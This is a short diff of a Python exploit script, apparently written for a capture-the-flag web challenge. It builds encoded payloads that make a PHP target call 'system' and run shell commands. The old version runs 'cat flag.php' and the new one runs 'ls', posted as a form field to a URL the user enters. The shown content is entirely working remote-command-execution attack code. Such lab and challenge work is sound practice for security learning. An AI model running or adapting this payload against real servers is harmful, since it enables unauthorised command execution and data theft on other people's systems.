@@ -34,6 +34,7 @@ def make_payload(cmd):
 
 
 URL = input('url:')
-payload = make_payload('system') + make_payload('cat flag.php')
-response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
+payload = make_payload('system') + make_payload('ls')
+print(payload,'\n')
+response = requests.post(URL, data={'mess': urllib.parse.unquote(payload)})
 print(response.text)
